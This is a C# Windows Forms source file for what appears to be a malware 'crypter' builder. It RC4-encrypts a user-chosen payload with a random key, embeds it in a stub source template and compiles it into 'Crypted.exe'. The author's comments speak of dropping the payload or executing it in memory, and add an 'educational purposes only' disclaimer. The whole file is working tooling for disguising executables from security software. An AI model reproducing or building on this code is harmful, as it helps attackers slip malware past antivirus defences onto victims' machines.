using EasyStore_Example.Properties;
using System;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace EasyStore_Example
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        /* Author: StarZ, UID 69588
         * 
         * Output can be modified to drop the payload.
         * Execute in memory only supports Managed (.net) payloads.
         * This code is explicitly for educational purposes only.
         * 
         * Note: This is a viable method for most larger payloads.
         */


        private void tbPath_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (!btnCompile.Enabled)
            {
                using (OpenFileDialog o = new OpenFileDialog())
                {
                    o.InitialDirectory = Environment.CurrentDirectory;
                    if(o.ShowDialog() == DialogResult.OK)
                    {
                        tbPath.Text = o.FileName;
                        btnCompile.Enabled = true;
                    }
                }
            }
        }
        private void cryptPayload(string payloadPath, byte[] key)
        {
            byte[] payLoad = File.ReadAllBytes(payloadPath); // Buffer with our payload

            //Prepare our code.
            string outputSource = Resources.outputSource.ToString().Replace("%%payLoadData%%", Convert.ToBase64String(RC4.Encrypt(key, payLoad))).Replace("%%KEY%%", Encoding.Default.GetString(key));

            //Compile our output.
            string compilerResults = CodeDOM.Compile(outputSource, Environment.CurrentDirectory + @"\Crypted.exe");

            if(compilerResults == "")
            {
                MessageBox.Show("Success!");
            }
            else
            {
                MessageBox.Show("Compiler Error. (Modified Source Code?)");
                //Output compilerResults here.
            }
        }

        private void btnCompile_Click(object sender, EventArgs e)
        {
           cryptPayload(tbPath.Text, Encoding.Default.GetBytes(Guid.NewGuid().ToString()));
        }
    }
}
